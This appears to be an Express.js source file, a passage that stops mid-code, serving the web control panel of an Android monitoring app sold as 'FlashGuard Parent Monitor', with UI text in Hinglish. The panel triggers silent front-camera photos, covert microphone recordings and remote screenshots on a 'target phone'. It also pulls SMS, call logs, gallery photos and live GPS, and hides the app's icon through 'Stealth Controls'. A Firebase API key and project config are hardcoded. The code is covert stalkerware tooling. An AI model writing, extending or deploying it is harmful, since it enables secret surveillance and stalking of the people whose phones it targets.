import { Router } from "express";

const router = Router();

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o",
  authDomain: "flashguard-99c20.firebaseapp.com",
  databaseURL: "https://flashguard-99c20-default-rtdb.firebaseio.com",
  projectId: "flashguard-99c20",
  storageBucket: "flashguard-99c20.appspot.com",
  messagingSenderId: "1026475439765",
  appId: "1:1026475439765:android:55df02c099239e8b4c4d9c",
};

router.get("/monitor", (_req, res) => {
  const cfg = JSON.stringify(FIREBASE_CONFIG);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FlashGuard — Parent Monitor</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#080B14;--card:#181C2E;--border:#2a2f4a;--purple:#7B6FFF;--green:#00E5A0;--red:#FF4F6B;--amber:#FFB830;--blue:#3DAAFF}
body{background:var(--bg);color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;padding-bottom:80px}
.header{background:var(--card);border-bottom:1px solid var(--border);padding:14px 16px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:100}
.header h1{font-size:17px;font-weight:800;flex:1}
.badge{padding:5px 12px;border-radius:20px;font-size:10px;font-weight:800;letter-spacing:1.2px}
.badge.live{background:rgba(0,229,160,.13);color:var(--green);border:1px solid rgba(0,229,160,.4)}
.badge.offline{background:rgba(255,79,107,.13);color:var(--red);border:1px solid rgba(255,79,107,.4)}

/* Nav tabs */
.nav{display:flex;overflow-x:auto;background:var(--card);border-bottom:1px solid var(--border);position:sticky;top:52px;z-index:99;scrollbar-width:none}
.nav::-webkit-scrollbar{display:none}
.nav-btn{padding:12px 16px;font-size:12px;font-weight:700;color:#ffffff55;border:none;background:none;cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
.nav-btn.active{color:var(--purple);border-bottom-color:var(--purple)}

/* Pages */
.page{display:none;padding:14px;max-width:520px;margin:0 auto}
.page.active{display:block}

/* Cards */
.card{background:var(--card);border-radius:14px;border:1px solid var(--border);margin-bottom:12px;overflow:hidden}
.card-body{padding:14px}
.sec{font-size:10px;font-weight:700;color:#ffffff44;letter-spacing:1.4px;text-transform:uppercase;margin:16px 0 8px}

/* Stats grid */
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
.stat{background:#0d1020;border-radius:12px;padding:13px;border:1px solid var(--border)}
.stat-ico{font-size:18px;margin-bottom:6px}
.stat-val{font-size:14px;font-weight:700}
.stat-lbl{font-size:10px;color:#ffffff44;margin-top:2px;letter-spacing:.6px;text-transform:uppercase}

/* Battery bar */
.batt-bar{height:8px;background:#111;border-radius:4px;overflow:hidden;margin-top:6px}
.batt-fill{height:100%;border-radius:4px;transition:.3s}

/* Map */
#map{width:100%;height:200px}

/* Btn */
.btn{width:100%;padding:12px;border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s;margin-bottom:8px}
.btn:active{opacity:.8}
.btn:disabled{opacity:.45;cursor:not-allowed}
.btn-purple{background:var(--purple)}
.btn-red{background:var(--red)}
.btn-green{background:var(--green);color:#000}
.btn-amber{background:var(--amber);color:#000}
.btn-blue{background:var(--blue)}
.btn-ghost{background:#1e2235;border:1px solid var(--border);color:#ffffff99}

/* Duration pills */
.pills{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
.pill{padding:6px 12px;border-radius:20px;border:1px solid var(--border);font-size:11px;font-weight:700;cursor:pointer;background:#0d1020;color:#fff}
.pill.active{background:var(--purple);border-color:var(--purple)}

/* Log list */
.log-item{display:flex;gap:12px;align-items:flex-start;padding:11px 0;border-bottom:1px solid #ffffff08}
.log-item:last-child{border-bottom:none}
.log-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
.log-title{font-size:12px;font-weight:600;color:#fff}
.log-sub{font-size:10px;color:#ffffff44;margin-top:2px}
.log-right{margin-left:auto;text-align:right;flex-shrink:0}
.log-time{font-size:10px;color:#ffffff33}
.log-tag{font-size:9px;padding:2px 7px;border-radius:20px;font-weight:700;display:inline-block;margin-top:3px}
.tag-in{background:rgba(0,229,160,.15);color:var(--green)}
.tag-out{background:rgba(61,170,255,.15);color:var(--blue)}
.tag-miss{background:rgba(255,79,107,.15);color:var(--red)}
.tag-sms{background:rgba(255,184,48,.15);color:var(--amber)}

/* Photo grid */
.photo-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;padding:10px}
.photo-item{position:relative;aspect-ratio:1;border-radius:8px;overflow:hidden;background:#111;cursor:pointer}
.photo-item img{width:100%;height:100%;object-fit:cover}
.photo-time{position:absolute;bottom:0;left:0;right:0;padding:4px 6px;background:linear-gradient(transparent,rgba(0,0,0,.8));font-size:9px;color:#ffffffbb}

/* Audio list */
.audio-item{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #ffffff08}
.audio-item:last-child{border-bottom:none}
.play-btn{width:36px;height:36px;border-radius:50%;background:var(--purple);display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;border:none;color:#fff;font-size:14px}

/* Device list */
.dev-item{display:flex;align-items:center;gap:12px;padding:13px 14px;border-bottom:1px solid var(--border);cursor:pointer}
.dev-item:last-child{border-bottom:none}
.dev-item.sel{background:rgba(123,111,255,.08)}
.dev-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
.dev-dot.on{background:var(--green);box-shadow:0 0 6px var(--green)}
.dev-dot.off{background:#333}

/* Geofence */
.slider-row{display:flex;align-items:center;gap:10px;margin:8px 0}
.slider-row input{flex:1;accent-color:var(--amber)}
.gf-status{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:8px;font-size:11px;font-weight:700}

/* No data */
.empty{text-align:center;padding:28px 16px;color:#ffffff22}
.empty-ico{font-size:34px;margin-bottom:8px}

/* Lightbox */
#lb{display:none;position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:500;align-items:center;justify-content:center;padding:16px}
#lb.open{display:flex}
#lb img{max-width:100%;max-height:88vh;border-radius:10px;object-fit:contain}
#lb-x{position:absolute;top:16px;right:16px;background:rgba(255,255,255,.15);border:none;color:#fff;width:36px;height:36px;border-radius:50%;font-size:18px;cursor:pointer}

/* Toast */
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e2235;border:1px solid var(--border);border-radius:10px;padding:10px 18px;font-size:12px;color:#fff;opacity:0;transition:.3s;pointer-events:none;z-index:999;white-space:nowrap;max-width:90vw;text-align:center}
.toast.show{opacity:1}

.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div class="header">
  <span style="font-size:20px">🛡</span>
  <h1>FlashGuard Monitor</h1>
  <span class="badge offline" id="conn-badge">CONNECTING…</span>
</div>

<div class="nav">
  <button class="nav-btn active" onclick="showPage('p-devices')">📱 Devices</button>
  <button class="nav-btn" onclick="showPage('p-overview')">📊 Overview</button>
  <button class="nav-btn" onclick="showPage('p-location')">📍 Location</button>
  <button class="nav-btn" onclick="showPage('p-screen')">🖥 Screen</button>
  <button class="nav-btn" onclick="showPage('p-camera')">📷 Camera</button>
  <button class="nav-btn" onclick="showPage('p-calls')">📞 Calls</button>
  <button class="nav-btn" onclick="showPage('p-sms')">💬 SMS</button>
  <button class="nav-btn" onclick="showPage('p-audio')">🎙 Audio</button>
  <button class="nav-btn" onclick="showPage('p-gallery')">🖼 Gallery</button>
  <button class="nav-btn" onclick="showPage('p-controls')">⚙️ Controls</button>
</div>

<!-- ════════ DEVICES ════════ -->
<div class="page active" id="p-devices">
  <div class="sec">Monitored Devices</div>
  <div class="card">
    <div id="dev-list">
      <div class="empty"><div class="empty-ico">📱</div>
        <div>Koi device nahi mila<br>Target phone pe FlashGuard install karo</div></div>
    </div>
  </div>
  <div class="card card-body" style="background:rgba(123,111,255,.07);border-color:rgba(123,111,255,.25)">
    <div style="font-size:12px;color:#ffffff88;line-height:1.8">
      <b style="color:var(--purple)">Kaise kaam karta hai:</b><br>
      1️⃣ FlashGuard APK target phone pe install karo<br>
      2️⃣ Sab permissions Allow karo<br>
      3️⃣ Device yahan automatically appear ho jaayega<br>
      4️⃣ Device select karo → sab data real-time dekho
    </div>
  </div>
</div>

<!-- ════════ OVERVIEW ════════ -->
<div class="page" id="p-overview">
  <div class="sec">Live Status</div>
  <div class="stats">
    <div class="stat">
      <div class="stat-ico">📡</div>
      <div class="stat-val" id="ov-status" style="color:var(--green)">—</div>
      <div class="stat-lbl">Device</div>
    </div>
    <div class="stat">
      <div class="stat-ico">📍</div>
      <div class="stat-val" id="ov-gps" style="color:var(--green)">—</div>
      <div class="stat-lbl">GPS</div>
    </div>
    <div class="stat">
      <div class="stat-ico">📞</div>
      <div class="stat-val" id="ov-calls" style="color:var(--blue)">—</div>
      <div class="stat-lbl">Call Logs</div>
    </div>
    <div class="stat">
      <div class="stat-ico">💬</div>
      <div class="stat-val" id="ov-sms" style="color:var(--amber)">—</div>
      <div class="stat-lbl">SMS</div>
    </div>
  </div>

  <div class="sec">Battery</div>
  <div class="card card-body">
    <div style="display:flex;align-items:center;gap:10px">
      <span id="batt-icon" style="font-size:22px">🔋</span>
      <div style="flex:1">
        <div style="display:flex;justify-content:space-between;margin-bottom:4px">
          <span id="batt-text" style="font-size:13px;font-weight:700">—%</span>
          <span id="batt-state" style="font-size:11px;color:#ffffff55">—</span>
        </div>
        <div class="batt-bar">
          <div class="batt-fill" id="batt-fill" style="width:0%;background:var(--green)"></div>
        </div>
      </div>
    </div>
  </div>

  <div class="sec">Last Seen</div>
  <div class="card card-body">
    <div style="font-size:13px;color:#ffffff88" id="ov-lastseen">—</div>
  </div>
</div>

<!-- ════════ LOCATION ════════ -->
<div class="page" id="p-location">
  <div class="sec">Live Location</div>
  <div class="card">
    <div id="map"></div>
    <div class="card-body" style="padding-top:10px">
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px">
        <div style="background:#0d1020;padding:9px;border-radius:9px">
          <div style="font-size:9px;color:#ffffff44;margin-bottom:3px">LATITUDE</div>
          <div style="font-size:11px;font-weight:700" id="loc-lat">—</div>
        </div>
        <div style="background:#0d1020;padding:9px;border-radius:9px">
          <div style="font-size:9px;color:#ffffff44;margin-bottom:3px">LONGITUDE</div>
          <div style="font-size:11px;font-weight:700" id="loc-lng">—</div>
        </div>
        <div style="background:#0d1020;padding:9px;border-radius:9px">
          <div style="font-size:9px;color:#ffffff44;margin-bottom:3px">ACCURACY</div>
          <div style="font-size:11px;font-weight:700" id="loc-acc">—</div>
        </div>
      </div>
      <div style="font-size:11px;color:#ffffff33;margin-bottom:10px" id="loc-time">—</div>
      <a id="maps-link" href="#" target="_blank" style="text-decoration:none">
        <button class="btn btn-ghost">🗺 Google Maps pe kholo</button>
      </a>
    </div>
  </div>

  <div class="sec">Geofence Alert</div>
  <div class="card card-body">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
      <span style="font-size:13px;font-weight:700">🔔 Safe Zone</span>
      <span class="gf-status" id="gf-status" style="background:rgba(0,229,160,.12);color:var(--green)">✅ Inside</span>
    </div>
    <div style="font-size:12px;color:#ffffff55;margin-bottom:10px">Current location ko center mark karega</div>
    <div class="slider-row">
      <span style="font-size:12px;color:#ffffff88">Radius:</span>
      <input type="range" id="gf-radius" min="100" max="5000" step="100" value="500">
      <span style="font-size:12px;font-weight:700;color:var(--amber);min-width:55px" id="gf-radius-val">500 m</span>
    </div>
    <button class="btn btn-amber" id="gf-btn" onclick="setGeofence()">🔔 Set Geofence Here</button>
  </div>
</div>

<!-- ════════ SCREEN ════════ -->
<div class="page" id="p-screen">
  <div class="sec">Remote Screen Monitor</div>

  <!-- Live status + take screenshot -->
  <div class="card card-body">
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
      <span style="font-size:22px">🖥</span>
      <div style="flex:1">
        <div style="font-size:13px;font-weight:700">Live Screen Capture</div>
        <div style="font-size:11px;color:#ffffff44" id="scr-status">Target phone ka screen remotely dekho</div>
      </div>
      <div id="scr-dot" style="width:10px;height:10px;border-radius:50%;background:#333"></div>
    </div>
    <button class="btn btn-purple" id="scr-btn" onclick="takeScreenshot()">🖥 Screenshot Lo</button>
    <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
      <label style="font-size:11px;color:#ffffff55;display:flex;align-items:center;gap:6px;cursor:pointer">
        <input type="checkbox" id="scr-auto" style="accent-color:var(--purple)">
        Auto screenshot (har 30 sec)
      </label>
    </div>
  </div>

  <!-- Latest screenshot (large preview) -->
  <div class="sec" style="display:flex;justify-content:space-between;align-items:center">
    <span>Latest Screenshot</span>
    <span id="scr-time" style="color:#ffffff33;font-size:10px;font-weight:400">—</span>
  </div>
  <div class="card" id="scr-latest-wrap" style="aspect-ratio:9/16;display:flex;align-items:center;justify-content:center;background:#0d1020;cursor:pointer" onclick="openLb(document.getElementById('scr-latest').src)">
    <img id="scr-latest" src="" style="width:100%;height:100%;object-fit:contain;display:none;border-radius:13px">
    <div id="scr-empty" style="text-align:center;color:#ffffff22;padding:20px">
      <div style="font-size:36px;margin-bottom:8px">📵</div>
      <div style="font-size:12px">Screenshot button dabao<br>ya auto enable karo</div>
    </div>
  </div>

  <!-- Screenshot history -->
  <div class="sec" style="display:flex;justify-content:space-between;align-items:center">
    <span>History</span>
    <span id="scr-count" style="color:var(--purple);font-weight:700">0</span>
  </div>
  <div class="card">
    <div id="scr-grid" class="photo-grid">
      <div class="empty" style="grid-column:1/-1">
        <div class="empty-ico">🖥</div><div>Abhi koi screenshot nahi</div>
      </div>
    </div>
  </div>
</div>

<!-- ════════ CAMERA ════════ -->
<div class="page" id="p-camera">
  <div class="sec">Remote Capture</div>
  <div class="card card-body">
    <button class="btn btn-red" id="cap-btn" onclick="triggerCapture()">📷 Silent Capture Karo</button>
    <div style="font-size:11px;color:#ffffff33;text-align:center">Target ke front camera se silently photo lega</div>
  </div>

  <div class="sec" style="display:flex;justify-content:space-between;align-items:center">
    <span>Captures</span>
    <span id="cap-count" style="color:var(--red);font-weight:700">0</span>
  </div>
  <div class="card">
    <div id="cap-grid" class="photo-grid">
      <div class="empty" style="grid-column:1/-1">
        <div class="empty-ico">📸</div><div>Abhi koi capture nahi</div>
      </div>
    </div>
  </div>
</div>

<!-- ════════ CALLS ════════ -->
<div class="page" id="p-calls">
  <div class="sec" style="display:flex;justify-content:space-between">
    <span>Call Logs</span>
    <span id="call-count" style="color:var(--blue);font-weight:700">0</span>
  </div>
  <div class="card card-body">
    <div id="call-list">
      <div class="empty"><div class="empty-ico">📞</div><div>Call logs load ho rahe hain…</div></div>
    </div>
  </div>
</div>

<!-- ════════ SMS ════════ -->
<div class="page" id="p-sms">
  <div class="sec" style="display:flex;justify-content:space-between">
    <span>SMS Messages</span>
    <span id="sms-count" style="color:var(--amber);font-weight:700">0</span>
  </div>
  <div class="card card-body">
    <div id="sms-list">
      <div class="empty"><div class="empty-ico">💬</div><div>SMS logs load ho rahe hain…</div></div>
    </div>
  </div>
</div>

<!-- ════════ AUDIO ════════ -->
<div class="page" id="p-audio">
  <div class="sec">Mic Recording</div>
  <div class="card card-body">
    <div class="pills" id="dur-pills">
      <div class="pill active" onclick="setDur(10,this)">10s</div>
      <div class="pill" onclick="setDur(30,this)">30s</div>
      <div class="pill" onclick="setDur(60,this)">60s</div>
      <div class="pill" onclick="setDur(120,this)">2 min</div>
    </div>
    <button class="btn btn-purple" id="mic-btn" onclick="triggerMic()">🎙 Start Recording</button>
    <div style="font-size:11px;color:#ffffff33;text-align:center" id="mic-status">Silently record karega — audio yahan aayega</div>
  </div>

  <div class="sec">Recorded Audio</div>
  <div class="card card-body">
    <div id="audio-list">
      <div class="empty"><div class="empty-ico">🎙</div><div>Koi audio recording nahi abhi</div></div>
    </div>
  </div>
</div>

<!-- ════════ GALLERY ════════ -->
<div class="page" id="p-gallery">
  <div class="sec">Gallery Photos</div>
  <div class="card card-body">
    <button class="btn btn-green" id="gal-btn" onclick="syncGallery()">📸 Sync Gallery Photos</button>
    <div style="font-size:11px;color:#ffffff33;text-align:center" id="gal-status">Target ki latest 15 photos upload karega</div>
  </div>

  <div class="card">
    <div id="gal-grid" class="photo-grid">
      <div class="empty" style="grid-column:1/-1">
        <div class="empty-ico">🖼</div><div>Sync karo photos dekhne ke liye</div>
      </div>
    </div>
  </div>
</div>

<!-- ════════ CONTROLS ════════ -->
<div class="page" id="p-controls">
  <div class="sec">Stealth Controls</div>
  <div class="card card-body">
    <div style="margin-bottom:14px">
      <div style="font-size:13px;font-weight:700;margin-bottom:4px">👻 App Icon Hide/Show</div>
      <div style="font-size:11px;color:#ffffff44;margin-bottom:10px">Target ke phone se FlashGuard ka icon hide karo</div>
      <div style="display:flex;gap:8px">
        <button class="btn btn-ghost" style="flex:1" onclick="sendCmd('hide_icon',true)">🙈 Hide Icon</button>
        <button class="btn btn-ghost" style="flex:1" onclick="sendCmd('hide_icon',false)">👁 Show Icon</button>
      </div>
    </div>
  </div>

  <div class="sec">Data Refresh</div>
  <div class="card card-body">
    <button class="btn btn-blue" onclick="sendCmd('refresh_sms',true)" style="margin-bottom:8px">💬 Refresh SMS Logs</button>
    <button class="btn btn-ghost" onclick="sendCmd('send_gallery',true)">📸 Sync Gallery</button>
  </div>

  <div class="sec">Device Info</div>
  <div class="card card-body" id="ctrl-info">
    <div style="font-size:12px;color:#ffffff55;text-align:center">Device select karo pehle</div>
  </div>
</div>

<!-- Lightbox -->
<div id="lb" onclick="closeLb()">
  <button id="lb-x" onclick="closeLb()">✕</button>
  <img id="lb-img" src="" alt="">
</div>

<div class="toast" id="toast"></div>

<script type="module">
import { initializeApp }         from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, onValue, set, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

const cfg  = ${cfg};
const app  = initializeApp(cfg);
const db   = getDatabase(app);
const auth = getAuth(app);

let map, mapMarker, selId = null, micDur = 10;

// Auth
try { await signInAnonymously(auth); } catch(e){}
document.getElementById('conn-badge').textContent = 'LIVE';
document.getElementById('conn-badge').className = 'badge live';

// Map init
map = L.map('map',{zoomControl:true,attributionControl:false}).setView([20.59,78.96],5);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
const redDot = L.divIcon({
  html:'<div style="background:#FF4F6B;width:14px;height:14px;border-radius:50%;border:3px solid #fff;box-shadow:0 2px 8px rgba(255,79,107,.6)"></div>',
  iconSize:[14,14],iconAnchor:[7,7],className:''
});

// ── All devices ──────────────────────────────────────────────────────────────
onValue(ref(db,'devices'),(snap)=>{
  const data = snap.val();
  const el   = document.getElementById('dev-list');
  if(!data){
    el.innerHTML='<div class="empty"><div class="empty-ico">📱</div><div>Koi device nahi mila<br>Target phone pe FlashGuard install karo</div></div>';
    return;
  }
  const devs = Object.entries(data);
  el.innerHTML = devs.map(([id,d])=>{
    const online = d?.meta?.online===true;
    const short  = id.substring(0,8)+'…';
    const ts     = d?.meta?.startedAt;
    const ago    = ts ? timeAgo(ts) : '?';
    return \`<div class="dev-item\${selId===id?' sel':''}" onclick="selDev('\${id}')">
      <div class="dev-dot \${online?'on':'off'}"></div>
      <div style="flex:1;min-width:0">
        <div style="font-size:12px;font-weight:700">Device \${short}</div>
        <div style="font-size:10px;color:#ffffff44">\${online?'🟢 Online':'⚫ Offline'} · \${ago}</div>
      </div>
      <div style="color:#ffffff22">›</div>
    </div>\`;
  }).join('');
  if(!selId && devs.length>0) selDev(devs[0][0]);
});

// ── Select device ─────────────────────────────────────────────────────────────
window.selDev = function(id){
  selId = id;

  // Go to overview
  showPage('p-overview');

  const devRef = ref(db,'devices/'+id);

  // Meta / status
  onValue(ref(db,'devices/'+id+'/meta'),(snap)=>{
    const m = snap.val();
    document.getElementById('ov-status').textContent  = m?.online ? '🟢 Online' : '⚫ Offline';
    document.getElementById('ov-lastseen').textContent = m?.startedAt ? 'Started: '+fmtDate(m.startedAt) : '—';
    // ctrl info
    document.getElementById('ctrl-info').innerHTML = \`
      <div style="font-size:11px;color:#ffffff66;line-height:2">
        <b>Device ID:</b> \${id.substring(0,18)}…<br>
        <b>Version:</b> \${m?.version||'—'}<br>
        <b>Started:</b> \${m?.startedAt?fmtDate(m.startedAt):'—'}<br>
        <b>Icon hidden:</b> \${m?.icon_hidden?'Yes':'No'}
      </div>\`;
  });

  // Battery
  onValue(ref(db,'devices/'+id+'/battery'),(snap)=>{
    const b = snap.val();
    if(!b) return;
    const lvl = b.level||0;
    const chg = b.charging;
    document.getElementById('batt-text').textContent = lvl+'%';
    document.getElementById('batt-state').textContent = chg ? '⚡ Charging' : 'On battery';
    document.getElementById('batt-icon').textContent = chg ? '⚡' : lvl>50?'🔋':lvl>20?'🪫':'🔴';
    const fill = document.getElementById('batt-fill');
    fill.style.width = lvl+'%';
    fill.style.background = chg?'#00E5A0':lvl>50?'#00E5A0':lvl>20?'#FFB830':'#FF4F6B';
  });

  // Location
  onValue(ref(db,'devices/'+id+'/location'),(snap)=>{
    const loc = snap.val();
    document.getElementById('ov-gps').textContent = loc ? 'Active ✓' : 'No Fix';
    if(!loc) return;
    const lat = parseFloat(loc.lat), lng = parseFloat(loc.lng);
    document.getElementById('loc-lat').textContent  = lat.toFixed(5);
    document.getElementById('loc-lng').textContent  = lng.toFixed(5);
    document.getElementById('loc-acc').textContent  = (loc.accuracy||0).toFixed(0)+'m';
    document.getElementById('loc-time').textContent = 'Updated: '+timeAgo(loc.timestamp);
    document.getElementById('maps-link').href = \`https://www.google.com/maps?q=\${lat},\${lng}\`;
    if(mapMarker) mapMarker.setLatLng([lat,lng]);
    else mapMarker = L.marker([lat,lng],{icon:redDot}).addTo(map);
    map.setView([lat,lng],15);
  });

  // Geofence status
  onValue(ref(db,'devices/'+id+'/geofence/status'),(snap)=>{
    const s = snap.val();
    const outside = s?.outside===true;
    const el = document.getElementById('gf-status');
    el.style.background = outside?'rgba(255,79,107,.15)':'rgba(0,229,160,.12)';
    el.style.color = outside?'var(--red)':'var(--green)';
    el.textContent = outside ? \`⚠️ Outside (\${s?.distance}m)\` : '✅ Inside';
  });

  // Call logs
  onValue(ref(db,'devices/'+id+'/call_logs'),(snap)=>{
    const data = snap.val();
    const count = data ? Object.keys(data).length : 0;
    document.getElementById('ov-calls').textContent = count;
    document.getElementById('call-count').textContent = count;
    const el = document.getElementById('call-list');
    if(!data){ el.innerHTML='<div class="empty"><div class="empty-ico">📞</div><div>Koi call log nahi mila</div></div>'; return; }
    const sorted = Object.values(data)
      .sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
    el.innerHTML = sorted.map(c=>{
      const type = c.type?.toLowerCase()||'';
      const tag  = type.includes('incoming')?'<span class="log-tag tag-in">Incoming</span>':
                   type.includes('outgoing')?'<span class="log-tag tag-out">Outgoing</span>':
                   '<span class="log-tag tag-miss">Missed</span>';
      const dur  = c.duration>0 ? fmtDur(c.duration) : '';
      const ico  = type.includes('incoming')?'📲':type.includes('outgoing')?'📤':'❌';
      return \`<div class="log-item">
        <div class="log-icon" style="background:rgba(61,170,255,.12)">\${ico}</div>
        <div style="flex:1;min-width:0">
          <div class="log-title">\${c.name||'Unknown'}</div>
          <div class="log-sub">\${c.number||''} \${dur?'· '+dur:''}</div>
          \${tag}
        </div>
        <div class="log-right"><div class="log-time">\${c.timestamp?timeAgo(c.timestamp):''}</div></div>
      </div>\`;
    }).join('');
  });

  // SMS
  onValue(ref(db,'devices/'+id+'/sms_logs'),(snap)=>{
    const data = snap.val();
    const count = data ? Object.keys(data).length : 0;
    document.getElementById('ov-sms').textContent = count;
    document.getElementById('sms-count').textContent = count;
    const el = document.getElementById('sms-list');
    if(!data){ el.innerHTML='<div class="empty"><div class="empty-ico">💬</div><div>Koi SMS nahi mila<br>Controls mein Refresh karo</div></div>'; return; }
    const sorted = Object.values(data)
      .sort((a,b)=>(b.date||0)-(a.date||0));
    el.innerHTML = sorted.map(s=>{
      const isInbox = s.type==='inbox';
      const body = (s.body||'').substring(0,80)+(s.body?.length>80?'…':'');
      return \`<div class="log-item">
        <div class="log-icon" style="background:rgba(255,184,48,.12)">\${isInbox?'📩':'📤'}</div>
        <div style="flex:1;min-width:0">
          <div class="log-title">\${s.address||'Unknown'}</div>
          <div class="log-sub">\${body}</div>
          <span class="log-tag \${isInbox?'tag-sms':'tag-out'}">\${isInbox?'Inbox':'Sent'}</span>
        </div>
        <div class="log-right"><div class="log-time">\${s.date?timeAgo(s.date):''}</div></div>
      </div>\`;
    }).join('');
  });

  // Screenshots
  onValue(ref(db,'devices/'+id+'/screenshots'),(snap)=>{
    const data = snap.val();
    const count = data ? Object.keys(data).length : 0;
    document.getElementById('scr-count').textContent = count;
    const el = document.getElementById('scr-grid');
    if(!data){ el.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="empty-ico">🖥</div><div>Abhi koi screenshot nahi</div></div>'; return; }
    const sorted = Object.values(data).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
    // Latest screenshot big preview
    const latest = sorted[0];
    const latImg = document.getElementById('scr-latest');
    const latEmpty = document.getElementById('scr-empty');
    if(latest?.url){
      latImg.src = latest.url; latImg.style.display='block'; latEmpty.style.display='none';
      document.getElementById('scr-time').textContent = timeAgo(latest.timestamp);
    }
    // History grid
    el.innerHTML = sorted.slice(0,30).map(s=>{
      const t = s.timestamp ? new Date(s.timestamp).toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'}) : '';
      return \`<div class="photo-item" onclick="openLb('\${s.url}')">
        <img src="\${s.url}" loading="lazy" style="object-fit:cover">
        <div class="photo-time">\${t}</div>
      </div>\`;
    }).join('');
  });

  // Screen status
  onValue(ref(db,'devices/'+id+'/screen/status'),(snap)=>{
    const s = snap.val()||'idle';
    const el = document.getElementById('scr-status');
    const dot = document.getElementById('scr-dot');
    const btn = document.getElementById('scr-btn');
    if(s==='capturing'){
      el.textContent='🔴 Screenshot le raha hai…';
      dot.style.background='var(--red)'; dot.style.boxShadow='0 0 6px var(--red)';
      btn.disabled=true; btn.innerHTML='<div class="spinner"></div> Capturing…';
    } else {
      el.textContent = s==='done'?'✅ Screenshot ready!':s==='error'?'❌ Error — permission check karo':s==='no_permission'?'⚠️ Screen capture permission nahi mila':'Target phone ka screen remotely dekho';
      dot.style.background = s==='done'?'var(--green)':s==='error'?'var(--red)':'#333';
      dot.style.boxShadow = s==='done'?'0 0 6px var(--green)':'none';
      btn.disabled=false; btn.innerHTML='🖥 Screenshot Lo';
    }
  });

  // Camera captures
  onValue(ref(db,'devices/'+id+'/captures'),(snap)=>{
    const data = snap.val();
    const count = data ? Object.keys(data).length : 0;
    document.getElementById('cap-count').textContent = count;
    const el = document.getElementById('cap-grid');
    if(!data){ el.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="empty-ico">📸</div><div>Koi capture nahi</div></div>'; return; }
    const sorted = Object.values(data).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,30);
    el.innerHTML = sorted.map(c=>{
      const t = c.timestamp ? new Date(c.timestamp).toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'}) : '';
      return \`<div class="photo-item" onclick="openLb('\${c.url}')">
        <img src="\${c.url}" loading="lazy">
        <div class="photo-time">\${t}</div>
      </div>\`;
    }).join('');
  });

  // Audio recordings
  onValue(ref(db,'devices/'+id+'/audio_logs'),(snap)=>{
    const data = snap.val();
    const el = document.getElementById('audio-list');
    if(!data){ el.innerHTML='<div class="empty"><div class="empty-ico">🎙</div><div>Koi recording nahi</div></div>'; return; }
    const sorted = Object.values(data).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
    el.innerHTML = sorted.map((a,i)=>\`
      <div class="audio-item">
        <button class="play-btn" onclick="playAudio('\${a.url}')">▶</button>
        <div style="flex:1">
          <div style="font-size:12px;font-weight:700">Recording \${sorted.length-i}</div>
          <div style="font-size:10px;color:#ffffff44">\${fmtDur(a.duration)} · \${a.timestamp?timeAgo(a.timestamp):''}</div>
        </div>
        <a href="\${a.url}" download style="color:var(--purple);font-size:18px;text-decoration:none">⬇</a>
      </div>\`).join('');
  });

  // Gallery
  onValue(ref(db,'devices/'+id+'/gallery/photos'),(snap)=>{
    const data = snap.val();
    const el = document.getElementById('gal-grid');
    if(!data){ el.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="empty-ico">🖼</div><div>Sync karo photos dekhne ke liye</div></div>'; return; }
    const sorted = Object.values(data).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
    el.innerHTML = sorted.map(p=>{
      const t = p.timestamp ? new Date(p.timestamp).toLocaleDateString('en-IN',{day:'2-digit',month:'short'}) : '';
      return \`<div class="photo-item" onclick="openLb('\${p.url}')">
        <img src="\${p.url}" loading="lazy">
        <div class="photo-time">\${t}</div>
      </div>\`;
    }).join('');
  });

  // Gallery status
  onValue(ref(db,'devices/'+id+'/gallery/status'),(snap)=>{
    const s = snap.val()||'';
    const el = document.getElementById('gal-status');
    if(s==='uploading') el.textContent = '⏳ Upload ho raha hai…';
